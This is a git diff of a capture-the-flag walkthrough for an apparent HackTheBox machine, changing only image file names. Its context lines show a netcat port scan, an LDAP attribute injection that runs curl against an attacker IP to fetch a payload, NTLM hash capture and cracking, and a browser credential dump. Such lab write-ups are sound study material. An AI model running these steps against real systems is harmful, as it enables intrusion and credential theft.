@@ -203,7 +203,7 @@ for p in {1..65535}; do nc -vn 192.168.0.2 $p -w 1 -z & done 2> output.txt
 
 From here, we can see some ports that are open.
 
-<figure><img src="../../../.gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (96) (1).png" alt=""><figcaption></figcaption></figure>
 
 This pretty much confirms that the actual DC is at 192.168.0.2. We would need to use chisel and proxychains to direct traffic there for further enumeration.&#x20;
 
@@ -264,7 +264,7 @@ replace: mobile
 mobile: 1;curl http://10.10.14.29/rcecfmed
 ```
 
-<figure><img src="../../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (93) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../../.gitbook/assets/image (76) (3).png" alt=""><figcaption></figcaption></figure>
 
@@ -298,7 +298,7 @@ We can change the commands executed within the `program.cs` file to what we want
 
 Eventually, you'll get a shell.
 
-<figure><img src="../../../.gitbook/assets/image (86) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (86) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 The shell is a bit buggy if we leave the LDAP entry that is executing the payload to continue running, so I changed it back to numbers after getting the shell to prevent this from happening.
 
@@ -312,7 +312,7 @@ As this new user, I enumerated around a bit. Found another user on the host name
 
 We also find out the Domain Admins:
 
-<figure><img src="../../../.gitbook/assets/image (84) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (84) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 Seems that bob.wood is both a user and an admin. Perhaps, he is using the same device to switch between user and administrator accounts. We'll keep this in mind for later.
 
@@ -320,7 +320,7 @@ I ran WinPEAS within the machine in the `C:\Windows\Debug\wia` directory to bypa
 
 We can check to see that the NTLM settings are insecure:
 
-<figure><img src="../../../.gitbook/assets/image (80) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (80) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 NTLMv2 is the legacy protocol that uses the challenge-response method of authenticating users, and **this involves sending the user hash**. This means that the next step is to intercept this response and capture the hash.
 
@@ -346,11 +346,11 @@ Here's the output of that:
 net use \\webserver.windcorp.htb\share
 </code></pre>
 
-<figure><img src="../../../.gitbook/assets/image (82) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (82) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can then crack this hash using `john`.
 
-<figure><img src="../../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (90) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Bob.Wood
 
@@ -378,7 +378,7 @@ I went to search for Github Repos with tools that could decrypt this thing, and 
 
 This tool would help us decrypt the data we need. We can download this to the machine. We can run this thing, and see that it successfully dumps out data from the browser.
 
-<figure><img src="../../../.gitbook/assets/image (85) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (85) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 And we can find the credentials for bob.woodadm.
 
